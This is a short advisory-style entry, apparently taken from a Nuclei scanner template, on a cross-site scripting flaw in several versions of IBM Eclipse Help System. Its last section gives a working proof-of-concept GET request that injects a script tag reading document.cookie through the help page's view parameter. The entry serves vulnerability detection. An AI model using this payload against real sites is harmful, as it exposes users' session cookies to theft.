# Vulnerability: IBM Eclipse Help System - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`eclipse-help-system-xss.yaml`)

## Description
IBM Eclipse Help System 6.1.0 through 6.1.0.6, 6.1.5 through 6.1.5.3, 7.0 through 7.0.0.2, and 8.0 prior to 8.0.0.1 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

